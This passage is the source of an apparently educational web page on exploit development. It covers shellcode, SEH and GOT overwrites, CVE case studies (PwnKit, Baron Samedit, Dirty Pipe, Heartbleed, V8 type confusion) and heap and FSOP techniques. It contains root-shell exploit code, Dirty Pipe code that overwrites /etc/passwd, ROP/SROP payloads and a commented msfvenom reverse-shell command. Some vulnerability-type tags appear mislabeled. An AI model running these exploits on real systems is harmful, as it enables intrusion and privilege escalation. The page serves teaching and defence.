context.arch = 'amd64'
context.os = 'linux'

# Generate shellcode
shellcode = asm(shellcraft.sh())        # execve shell
shellcode = asm(shellcraft.cat('flag')) # read file

# Custom assembly
shellcode = asm('''
    xor rdi, rdi
    mov al, 60
    syscall
''')

# Generate with msfvenom
# msfvenom -p linux/x64/shell_reverse_tcp \\
#          LHOST=10.10.10.10 LPORT=4444 \\
#          -f python -b '\\x00\\x0a'`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#a855f7", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Shellcode Techniques
              </Typography>
              <Typography variant="body2">
                • <strong>Egg hunter:</strong> Small stub that searches for larger payload in memory<br/>
                • <strong>Staged:</strong> Small loader downloads/decodes main payload<br/>
                • <strong>Polymorphic:</strong> Self-modifying to evade signatures<br/>
                • <strong>Alphanumeric:</strong> Only printable ASCII characters<br/>
                • <strong>Encoder stubs:</strong> XOR, ROT, custom decoders
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Windows Exploitation */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="windows-exploitation" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <WindowIcon sx={{ color: "#f87171" }} /> Windows Exploitation Specifics
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Windows exploitation has unique characteristics due to its architecture, calling conventions,
              and security features. Understanding Windows internals is crucial for Windows exploit development.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Windows x64 Calling Convention
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`First 4 arguments: RCX, RDX, R8, R9 (not RDI, RSI like Linux!)
Additional args:   Stack (right to left)
Return value:      RAX
Caller-saved:      RAX, RCX, RDX, R8-R11
Callee-saved:      RBX, RBP, RDI, RSI, R12-R15

Shadow space: Caller must reserve 32 bytes on stack
              for callee to spill register arguments

Stack alignment: 16-byte aligned before CALL`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Windows Security Features
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>DEP:</strong> Data Execution Prevention (NX equivalent)</li>
                  <li><strong>ASLR:</strong> Address Space Layout Randomization</li>
                  <li><strong>SafeSEH:</strong> Safe Structured Exception Handling</li>
                  <li><strong>SEHOP:</strong> SEH Overwrite Protection</li>
                  <li><strong>CFG:</strong> Control Flow Guard</li>
                  <li><strong>ACG:</strong> Arbitrary Code Guard</li>
                  <li><strong>CIG:</strong> Code Integrity Guard</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                SEH Exploitation (32-bit)
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`Structured Exception Handling chain:

┌─────────────────┐
│  Next SEH       │ → Points to next exception handler
├─────────────────┤
│  Handler        │ → Pointer to exception handler function
└─────────────────┘

SEH Overflow Attack:
1. Overflow buffer to reach SEH record
2. Overwrite Handler with pop pop ret gadget
3. Overwrite Next SEH with short jmp to shellcode
4. Trigger exception
5. Handler executes: pop pop ret → jumps to Next SEH
6. Short jmp lands in shellcode

Note: SafeSEH/SEHOP mitigate this attack`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#0ea5e9", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Windows Exploitation Tools
              </Typography>
              <Typography variant="body2">
                • <strong>WinDbg:</strong> Microsoft debugger for user/kernel mode<br/>
                • <strong>x64dbg:</strong> Open-source Windows debugger<br/>
                • <strong>Immunity Debugger:</strong> With mona.py for exploit dev<br/>
                • <strong>Process Hacker:</strong> Process/memory inspection<br/>
                • <strong>PE-bear:</strong> PE file analysis
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Linux Exploitation */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="linux-exploitation" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <ComputerIcon sx={{ color: "#f87171" }} /> Linux Exploitation Specifics
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Linux is the primary platform for learning exploit development due to its open-source nature
              and extensive tooling. Most CTF binary exploitation challenges target Linux.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Linux x64 System Calls
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`System call invocation:
  RAX = syscall number
  RDI = arg1, RSI = arg2, RDX = arg3
  R10 = arg4, R8 = arg5, R9 = arg6
  syscall instruction

Common syscalls:
  0   - read(fd, buf, count)
  1   - write(fd, buf, count)
  2   - open(filename, flags, mode)
  3   - close(fd)
  9   - mmap(addr, len, prot, flags, fd, off)
  10  - mprotect(addr, len, prot)
  59  - execve(filename, argv, envp)
  60  - exit(status)
  231 - exit_group(status)`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                GOT/PLT Exploitation
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`Lazy Binding Flow:
1. Code calls puts@plt
2. PLT stub jumps to GOT entry
3. First call: GOT points back to PLT (resolver)
4. Resolver finds puts() in libc, updates GOT
5. Subsequent calls: GOT has real puts() address

GOT Overwrite Attack:
1. Leak libc address (via puts/printf)
2. Calculate system() address
3. Overwrite puts@got with system()
4. Next puts("/bin/sh") → system("/bin/sh")

With Partial RELRO: GOT writable (attack works)
With Full RELRO: GOT read-only (need other targets)`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Useful One-Gadgets
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Find one-gadgets in libc
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

# Use in exploit:
one_gadget = libc.address + 0x4f3d5`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Kernel Exploitation Concepts
              </Typography>
              <Typography variant="body2">
                • <strong>SMEP:</strong> Supervisor Mode Execution Prevention<br/>
                • <strong>SMAP:</strong> Supervisor Mode Access Prevention<br/>
                • <strong>KASLR:</strong> Kernel Address Space Layout Randomization<br/>
                • <strong>Stack pivoting:</strong> Move to user-controlled kernel stack<br/>
                • <strong>ret2usr:</strong> Return to userspace (blocked by SMEP)
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Real-World CVE Case Studies */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="case-studies" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <HistoryEduIcon sx={{ color: "#f87171" }} /> Real-World CVE Case Studies
            </Typography>

            <Typography variant="body1" sx={{ mb: 3 }}>
              Studying real-world exploits provides invaluable insights into how vulnerabilities are discovered
              and exploited. These case studies cover famous CVEs with technical breakdowns.
            </Typography>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Heap" size="small" sx={{ bgcolor: alpha("#f87171", 0.2), color: "#f87171" }} />
                  <Typography sx={{ fontWeight: 600 }}>CVE-2021-4034: PwnKit (Polkit pkexec)</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="error" sx={{ mb: 2 }}>
                  <strong>Impact:</strong> Local privilege escalation to root on virtually all Linux distributions. CVSS: 7.8
                </Alert>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  A memory corruption vulnerability in Polkit's pkexec allowed any local user to gain root privileges.
                  The bug existed since 2009 and was trivial to exploit.
                </Typography>
                <CodeBlock
                  title="Vulnerability Root Cause"
                  code={`// pkexec reads argv[1] for the program to execute
// But if argc == 0 (no arguments), argv[0] is NULL
// pkexec reads argv[1] which is actually envp[0]!

// Memory layout when argc=0:
// argv[0] = NULL
// argv[1] = envp[0] = "PATH=..."  <- pkexec reads this!
// envp[1] = "HOME=..."

// The exploit:
// 1. Set envp[0] to "GCONV_PATH=./payload"
// 2. pkexec tries to execute this as a command
// 3. During path resolution, GCONV_PATH is injected
// 4. Custom charset conversion library loads as root
// 5. Attacker code executes with root privileges`}
                />
                <CodeBlock
                  title="Simplified Exploit Concept"
                  code={`// Create malicious gconv-modules file and shared library
// The library's constructor runs as root

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// This runs when the library loads
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/sh");
}

// Compile: gcc -shared -fPIC -o pwnkit.so exploit.c
// Then manipulate environment to load this library`}
                />
                <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Key Lessons:</Typography>
                  <Typography variant="body2">
                    • Edge cases (argc=0) often overlooked in testing<br/>
                    • Environment variable injection can be powerful<br/>
                    • SUID binaries require extreme scrutiny<br/>
                    • Patch: Proper argc validation before accessing argv
                  </Typography>
                </Box>
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Stack" size="small" sx={{ bgcolor: alpha("#3b82f6", 0.2), color: "#3b82f6" }} />
                  <Typography sx={{ fontWeight: 600 }}>CVE-2021-3156: Baron Samedit (sudo)</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="error" sx={{ mb: 2 }}>
                  <strong>Impact:</strong> Any local user to root without authentication. Affected sudo versions 1.8.2-1.9.5p1
                </Alert>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  A heap-based buffer overflow in sudo's argument parsing when running in "shell mode" (-s or -i flags).
                  The vulnerability was introduced in July 2011 and went undetected for nearly 10 years.
                </Typography>
                <CodeBlock
                  title="Vulnerability Mechanism"
                  code={`// sudo uses set_cmnd() to parse command arguments
// Backslash escaping logic had off-by-one error

// Normal: "sudo -s '\\\\'" → single backslash stored
// Bug: When parsing ends on backslash at chunk boundary,
//      the code writes past allocated buffer

// Exploitation strategy:
// 1. Trigger heap overflow with crafted arguments
// 2. Overflow into adjacent heap chunks
// 3. Corrupt heap metadata or function pointers
// 4. Gain code execution as root

// Key insight: Requires precise heap layout control
// LC_* environment variables used to shape heap`}
                />
                <CodeBlock
                  title="Detection & Mitigation"
                  code={`# Check if vulnerable:
sudoedit -s '\\' $(python3 -c 'print("A"*65535)')

# Vulnerable: "sudoedit: /: not a regular file"
# Patched: "usage: sudoedit..." error message

# Immediate mitigation before patching:
# Add to /etc/sudoers:
Defaults !sudoedit_checkdir`}
                />
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Use-After-Free" size="small" sx={{ bgcolor: alpha("#a855f7", 0.2), color: "#a855f7" }} />
                  <Typography sx={{ fontWeight: 600 }}>CVE-2022-0847: Dirty Pipe (Linux Kernel)</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="error" sx={{ mb: 2 }}>
                  <strong>Impact:</strong> Write to arbitrary read-only files, leading to root. Affected kernel 5.8+
                </Alert>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  A flaw in Linux kernel pipe handling allowed overwriting data in read-only files, including
                  SUID binaries. One of the most elegant Linux kernel exploits in recent years.
                </Typography>
                <CodeBlock
                  title="Exploitation Technique"
                  code={`// The pipe buffer reuse bug:
// 1. Create a pipe, fill it, then drain it
// 2. splice() a target file into the pipe
// 3. Write data to pipe (overwrites file's page cache!)

// The bug: PIPE_BUF_FLAG_CAN_MERGE flag not cleared
// when page is reused, allowing arbitrary writes

#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>

int main() {
    int pipefd[2];
    pipe(pipefd);

    // Fill and drain pipe to set merge flag
    char buf[4096];
    write(pipefd[1], buf, sizeof(buf));
    read(pipefd[0], buf, sizeof(buf));

    // Splice target file into pipe
    int fd = open("/etc/passwd", O_RDONLY);
    splice(fd, NULL, pipefd[1], NULL, 1, 0);

    // This write goes to the file's page cache!
    write(pipefd[1], "root::0:0::/root:/bin/sh\\n", 25);

    // Now /etc/passwd has empty root password
    return 0;
}`}
                />
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Integer Overflow" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.2), color: "#f59e0b" }} />
                  <Typography sx={{ fontWeight: 600 }}>CVE-2014-0160: Heartbleed (OpenSSL)</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="error" sx={{ mb: 2 }}>
                  <strong>Impact:</strong> Read up to 64KB of server memory per request. Exposed private keys, passwords, session tokens.
                </Alert>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  A missing bounds check in OpenSSL's heartbeat extension allowed attackers to read memory
                  contents from vulnerable servers. Affected approximately 17% of all SSL servers at disclosure.
                </Typography>
                <CodeBlock
                  title="The Bug"
                  code={`// TLS Heartbeat: Echo back data to prove connection alive
// Client sends: type(1) + length(2) + payload + padding
// Server should: Read 'length' bytes, echo them back

// VULNERABLE CODE:
// Server trusted client-provided length without checking!

// Attack:
// 1. Send heartbeat with length=65535 but tiny payload
// 2. Server reads 65535 bytes from memory (not just payload)
// 3. Memory may contain private keys, session data, etc.

/* Vulnerable code in ssl/d1_both.c */
p = &s->s3->rrec.data[0];           // Point to record
n2s(p, payload);                      // Read claimed length
pl = p;                               // Payload start

// BUG: No check that payload <= actual data received!

buffer = OPENSSL_malloc(1 + 2 + payload + padding);
memcpy(bp, pl, payload);              // Reads beyond buffer!`}
                />
                <CodeBlock
                  title="Detection"
                  code={`# Test for Heartbleed:
nmap -p 443 --script ssl-heartbleed target.com

# Or use testssl.sh:
./testssl.sh --heartbleed target.com

# Check OpenSSL version:
openssl version
# Vulnerable: 1.0.1 through 1.0.1f
# Fixed: 1.0.1g and later`}
                />
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Type Confusion" size="small" sx={{ bgcolor: alpha("#06b6d4", 0.2), color: "#06b6d4" }} />
                  <Typography sx={{ fontWeight: 600 }}>Browser Exploitation: V8 Type Confusion</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="info" sx={{ mb: 2 }}>
                  <strong>Context:</strong> Modern browser exploits often target JavaScript engines. V8 (Chrome) is a common target.
                </Alert>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  Type confusion vulnerabilities occur when code handles an object as a different type than intended.
                  In JavaScript engines, this often leads to memory corruption through confused array bounds.
                </Typography>
                <CodeBlock
                  title="Type Confusion Concept"
                  code={`// JavaScript engines optimize based on observed types
// If attacker can confuse the type system, memory corruption follows

// Example pattern (conceptual):
class Obj1 {
    constructor() { this.a = 1.1; }  // a is a float
}
class Obj2 {
    constructor() { this.a = {}; }   // a is an object pointer
}

// JIT compiles assuming Obj1 layout
// But attacker triggers code path where Obj2 is passed
// Engine reads object pointer as float → information leak
// Or writes float as object pointer → arbitrary write

// Modern exploitation chain:
// 1. Type confusion → Out-of-bounds read/write
// 2. Leak memory addresses (bypass ASLR)
// 3. Corrupt ArrayBuffer backing store
// 4. Build arbitrary read/write primitive
// 5. Overwrite JIT code or function pointer
// 6. Execute shellcode or ROP chain`}
                />
                <Box sx={{ bgcolor: alpha("#f59e0b", 0.1), p: 2, borderRadius: 1 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Browser Mitigations:</Typography>
                  <Typography variant="body2">
                    • <strong>Site Isolation:</strong> Separate processes per origin<br/>
                    • <strong>JIT hardening:</strong> Constant blinding, guard pages<br/>
                    • <strong>Sandbox:</strong> Renderer process restrictions<br/>
                    • <strong>CFI:</strong> Control Flow Integrity<br/>
                    • <strong>MTE:</strong> Memory Tagging Extension (ARM)
                  </Typography>
                </Box>
              </AccordionDetails>
            </Accordion>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Modern Exploitation Techniques */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="modern-techniques" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <RocketLaunchIcon sx={{ color: "#f87171" }} /> Modern Exploitation Techniques
            </Typography>

            <Typography variant="body1" sx={{ mb: 3 }}>
              As mitigations improve, exploit developers have evolved increasingly sophisticated techniques.
              These modern methods often combine multiple primitives into complex chains.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Stack Pivoting
              </Typography>
              <Typography variant="body2" sx={{ mb: 2 }}>
                When you can only overwrite a return address but need a full ROP chain, stack pivoting
                moves RSP to attacker-controlled memory containing the chain.
              </Typography>
              <CodeBlock
                code={`# Stack Pivot Gadgets:
# Goal: Move RSP to controlled buffer

# Common gadgets:
xchg rax, rsp ; ret          # If RAX points to buffer
mov rsp, rax ; ret           # Direct RSP control
leave ; ret                   # RSP = RBP; pop RBP
                              # (if RBP controlled)
pop rsp ; ret                 # Direct from stack

# Usage in pwntools:
pivot_gadget = elf.search(asm('xchg rax, rsp; ret')).__next__()
payload = flat(
    b'A' * offset,
    pivot_gadget,  # Return here
    buffer_addr,   # RAX value (from previous gadget)
)`}
              />
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                SROP (Sigreturn-Oriented Programming)
              </Typography>
              <Typography variant="body2" sx={{ mb: 2 }}>
                Abuse the sigreturn syscall to set all registers at once. A single sigreturn gadget
                can establish arbitrary register state for syscalls.
              </Typography>
              <CodeBlock
                code={`from pwn import *

# sigreturn restores ALL registers from stack
# We craft a fake signal frame

context.arch = 'amd64'

frame = SigreturnFrame()
frame.rax = 59                    # execve syscall
frame.rdi = binsh_addr            # "/bin/sh"
frame.rsi = 0                     # argv = NULL
frame.rdx = 0                     # envp = NULL
frame.rip = syscall_ret_addr      # syscall; ret gadget

# Trigger sigreturn
payload = flat(
    b'A' * offset,
    pop_rax_ret,          # Set RAX = 15 (sigreturn)
    15,
    syscall_ret,          # Call sigreturn
    bytes(frame)          # Fake signal frame
)`}
              />
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                ret2csu / ret2dlresolve
              </Typography>
              <Typography variant="body2" sx={{ mb: 2 }}>
                When gadgets are scarce, __libc_csu_init provides universal gadgets for calling functions
                with controlled arguments. ret2dlresolve fakes dynamic linking to call any libc function.
              </Typography>
              <CodeBlock
                code={`# __libc_csu_init gadgets (present in most binaries):

# Gadget 1: Pop registers
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# Gadget 2: Call function with args
mov rdx, r14      # arg3
mov rsi, r13      # arg2
mov edi, r12d     # arg1
call [r15 + rbx*8]

# Usage: Set up registers, call arbitrary function pointer

# ret2dlresolve (conceptual):
# 1. Craft fake Elf64_Sym and Elf64_Rela structures
# 2. Point to fake "system" symbol
# 3. Call _dl_runtime_resolve with crafted index
# 4. Resolver "finds" system() and calls it`}
              />
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Heap Feng Shui
              </Typography>
              <Typography variant="body2" sx={{ mb: 2 }}>
                Manipulating heap layout to position attacker-controlled data adjacent to target structures.
                Critical for use-after-free and heap overflow exploitation.
              </Typography>
              <CodeBlock
                code={`# Heap Feng Shui Strategies:

# 1. Hole Creation (for UAF)
allocs = [malloc(0x80) for _ in range(10)]  # Fill tcache
for a in allocs[::2]:
    free(a)                                   # Create holes

# 2. Coalescing (for overlapping chunks)
a = malloc(0x100)
b = malloc(0x100)  # Guard chunk
free(a)
free(b)            # b coalesces with a
# Next alloc of 0x208 overlaps both

# 3. Fastbin Dup (double free)
free(a)
free(b)            # Different chunk
free(a)            # a freed again!
# Fastbin: a -> b -> a (cycle)

# 4. Tcache Poisoning (glibc 2.27+)
free(a)
free(a)            # Double free (no key check bypass)
malloc(0x80)       # Returns a
# Write target address to a
malloc(0x80)       # Returns a again
malloc(0x80)       # Returns target address!`}
              />
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                File Structure Exploitation (FSOP)
              </Typography>
              <Typography variant="body2" sx={{ mb: 2 }}>
                Corrupting FILE structures in glibc to achieve code execution when I/O operations
                are performed. Useful when you can write to heap but not directly control execution.
              </Typography>
              <CodeBlock
                code={`# FILE structure exploitation:
# glibc FILE has function pointer table (_IO_jump_t)
# Corrupting vtable pointer leads to code execution

# Attack vectors:
# 1. _IO_OVERFLOW: Called when buffer full
# 2. _IO_UNDERFLOW: Called when buffer empty
# 3. _IO_FINISH: Called on fclose()

# Modern protection: __IO_vtable_check
# Bypass: Use _IO_str_jumps or other valid vtables

# House of Orange (conceptual):
# 1. Corrupt top chunk size
# 2. Trigger malloc to extend heap
# 3. Old top becomes freed chunk
# 4. Unsorted bin attack writes to _IO_list_all
# 5. Fake FILE structure in heap
# 6. Program exit calls _IO_flush_all_lockp
# 7. Our fake FILE's _IO_OVERFLOW executes`}
              />
            </Box>

            <Box sx={{ bgcolor: alpha("#a855f7", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Emerging Techniques
              </Typography>
              <Typography variant="body2">
                • <strong>FSOP variants:</strong> House of Kiwi, House of Emma, House of Pig<br/>
                • <strong>IO_FILE arbitrary read/write:</strong> Using wide character functions<br/>
                • <strong>Exit handlers:</strong> __exit_funcs, __call_tls_dtors<br/>
                • <strong>Thread Local Storage:</strong> TLS-based attacks for tcache<br/>
                • <strong>Safe-Linking bypass:</strong> Leak heap address to defeat pointer mangling
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Tools & Debugging */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="tools" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <BuildIcon sx={{ color: "#f87171" }} /> Tools & Debugging
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Effective exploit development requires mastering debugging tools. These allow you to understand
              program behavior, find vulnerabilities, and debug your exploits.
            </Typography>

            {/* Tools Comparison Matrix */}
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "#f87171" }}>
              Exploit Development Tool Matrix
            </Typography>
            <TableContainer sx={{ mb: 3 }}>
              <Table size="small" sx={{ bgcolor: "background.paper" }}>
                <TableHead>
                  <TableRow>
                    <TableCell sx={{ fontWeight: 700 }}>Tool</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Category</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Platform</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Primary Use</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {[
                    { tool: "pwntools", cat: "Framework", platform: "Linux", use: "Exploit scripting, shellcode, ROP" },
                    { tool: "GDB + pwndbg", cat: "Debugger", platform: "Linux", use: "Dynamic analysis, heap inspection" },
                    { tool: "GDB + GEF", cat: "Debugger", platform: "Linux", use: "Alternative GDB enhancement" },
                    { tool: "radare2/rizin", cat: "RE Framework", platform: "Cross", use: "Disassembly, binary patching" },
                    { tool: "Ghidra", cat: "Decompiler", platform: "Cross", use: "Static analysis, decompilation" },
                    { tool: "IDA Pro", cat: "Decompiler", platform: "Cross", use: "Industry standard RE tool" },
                    { tool: "ROPgadget", cat: "Gadget Finder", platform: "Cross", use: "Find ROP gadgets in binaries" },
                    { tool: "ropper", cat: "Gadget Finder", platform: "Cross", use: "ROP chain generation" },
                    { tool: "one_gadget", cat: "Analysis", platform: "Linux", use: "Find execve gadgets in libc" },
                    { tool: "checksec", cat: "Analysis", platform: "Linux", use: "Check binary protections" },
                    { tool: "WinDbg", cat: "Debugger", platform: "Windows", use: "User/kernel debugging" },
                    { tool: "x64dbg", cat: "Debugger", platform: "Windows", use: "User-mode debugging" },
                  ].map((row, idx) => (
                    <TableRow key={idx} sx={{ "&:hover": { bgcolor: alpha("#f87171", 0.05) } }}>
                      <TableCell sx={{ fontFamily: "monospace", color: "#f87171" }}>{row.tool}</TableCell>
                      <TableCell>{row.cat}</TableCell>
                      <TableCell>{row.platform}</TableCell>
                      <TableCell sx={{ color: "text.secondary" }}>{row.use}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Essential GDB Commands
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Basic commands
run [args]          # Start program
break *0x401234     # Set breakpoint at address
break main          # Set breakpoint at function
continue            # Continue execution
stepi / nexti       # Step one instruction
info registers      # Show registers
x/20wx $rsp         # Examine 20 words at RSP
x/s 0x401234        # Examine string at address
vmmap               # Show memory mappings (pwndbg)
checksec            # Show security features (pwndbg)

# Examining memory
x/10gx $rsp         # 10 giant (8-byte) hex at RSP
x/10i $rip          # Disassemble 10 instructions
print $rax          # Print register value

# With pwndbg/GEF/PEDA
heap                # Show heap info
bins                # Show free list bins
telescope $rsp 20   # Smart stack display`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Pwntools Essentials
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`from pwn import *

# Context setup
context.binary = './binary'
context.log_level = 'debug'

# Process interaction
p = process('./binary')
p = remote('host', port)

# Send/receive
p.sendline(b'data')
p.send(b'data')
p.recvline()
p.recvuntil(b'prompt: ')
p.interactive()

# Packing
p64(0xdeadbeef)     # Pack 64-bit little-endian
